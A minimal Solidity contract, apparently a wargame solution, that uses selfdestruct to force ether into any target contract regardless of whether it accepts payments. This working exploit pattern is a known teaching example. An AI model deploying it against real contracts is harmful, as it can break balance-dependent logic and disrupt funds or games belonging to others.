// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    function attack(address payable target) public payable {
        selfdestruct(target);
    }
}